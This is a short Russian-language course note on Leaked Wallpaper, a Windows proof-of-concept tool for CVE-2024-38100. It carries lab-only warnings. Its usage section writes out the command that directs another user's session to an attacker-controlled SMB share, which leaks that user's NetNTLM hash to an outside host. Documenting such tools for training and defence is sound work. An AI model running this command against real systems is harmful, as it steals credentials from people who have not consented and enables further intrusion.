---
topic: system-security
level: intermediate
status: legacy-tool-reference
last_reviewed: 2026-08-17
verified_against: https://github.com/decoder-it/LeakedWallpaper
---
# Leaked Wallpaper


> [!warning] Узкоспециализированный PoC
> Материал оставлен как исторический PoC. Используйте только зафиксированный исходный код в изолированной Windows-лаборатории после ручной проверки.

> [!warning] Разрешённая среда
> Исходный конспект сохранён. В рамках курса команды применяйте только к назначенной цели внешней учебной платформы и в пределах её правил; версии, зависимости и флаги сверяйте с первичной документацией.

## Введение 

**Leaked Wallpaper** - инструмент повышения привилегий (исправленный с помощью **CVE-2024-38100** в KB5040434), который позволяет получить **доступ к хэшу NetNTLM** пользователя из любого сеанса на компьютере, даже если мы работаем от имени пользователя с низкими привилегиями.

**GiHub** с подробностями: [MzHmO/LeakedWallpaper: Leak of any user's NetNTLM hash.](https://github.com/MzHmO/LeakedWallpaper)

---
## Использование

``` shell
.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg [-downgrade]

# Example
  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg -downgrade
```

---

## Video

[https://youtu.be/InyrqNeaZfQ](https://youtu.be/InyrqNeaZfQ)

If blocked, see [demo.mkv](https://github.com/MzHmO/LeakedWallpaper/blob/main/demo.mkv)
